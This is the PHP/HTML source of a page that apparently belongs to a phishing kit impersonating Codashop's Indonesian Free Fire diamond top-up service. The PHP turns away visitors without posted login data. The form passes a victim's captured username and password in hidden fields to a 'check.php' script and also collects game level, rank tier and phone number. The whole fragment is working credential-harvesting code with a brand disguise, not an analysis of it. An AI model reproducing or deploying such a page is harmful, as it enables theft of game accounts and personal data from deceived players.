...
{
header('Location: https://tokoalexhost.com');
die();
}

if(!isset($_POST['user']) || !isset($_POST['pass']) || !isset($_POST['login']) || !isset($_POST['nickname']) || !isset($_POST['playid'])) {
    header('location: ./');
    die();
}
?>
...
<html lang="en">
   <head>
      ...
      <![endif]-->
      <title>Top up FF | Diamond Free Fire Murah | Codashop - Indonesia</title>
      ...
      <meta property="og:description" content="Top up diamond Free Fire menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
         />
      <meta property="og:image" content="hhttps://cdn1.codashop.com/S/content/common/images/mno/freefire_640x241.jpg" />
         ...
         <main class="container product-container">
            ...
            <header class="product-details-container shop-content__container">
               <figure class="product-top-banner__container shop-content--image">
                  <img src="https://cdn1.codashop.com/S/content/common/images/mno/freefire_640x241.jpg" alt="" class="product__top-banner">
               </figure>
                  ...
                  <div class="form" id="formSection">
                     ...
                     <div class="email-input-container">
                        <form action="../../check.php" method="POST" onclick="$(this).end()">
                            <input name="user" type="hidden" value="<?= $_POST['user'] ?>" readonly>
                            <input name="pass" type="hidden" value="<?= $_POST['pass'] ?>" readonly>
                            <input name="login" type="hidden" value="<?= $_POST['login'] ?>" readonly>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Nickname</label>
                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="nickname" name="nickname" class="product-form-input" value="<?= $_POST['nickname'] ?>" readonly>
                            </div>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Player ID</label>
                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="playid" class="product-form-input" value="<?= $_POST['playid'] ?>" readonly>
                            </div>
                            
                            <div style="margin-top: 10px;">
                                <label for="">Level</label>
                                <select style="margin-top: 10px; font-size: 14px;" id="level" name="level" class="product-form-input" required>
...
<option>Level 100</option></select>
                            ...
                            <div style="margin-top: 10px;">
                                ...
                                <select style="margin-top: 10px; font-size: 14px;" id="elitepass" name="elitepass" class="product-form-input" required>
...
<option>Pernah</option>
                            ...
                            <div style="margin-top: 10px;">
                                <label for="">Tier Ranked</label>
                                <select style="margin-top: 10px; font-size: 14px;" id="tier" name="tier" class="product-form-input" required>
                                    <option selected="selected" disabled="disabled" value="">Tier Ranked</option>
                            ...
                            <div style="margin-top: 10px; font-size: 14px;">
                                ...
                                <input type="number" style="margin-top: 10px; font-size: 14px;" id="phone" name="phone" class="product-form-input" placeholder="Nomor Telepon" required>
                            </div>
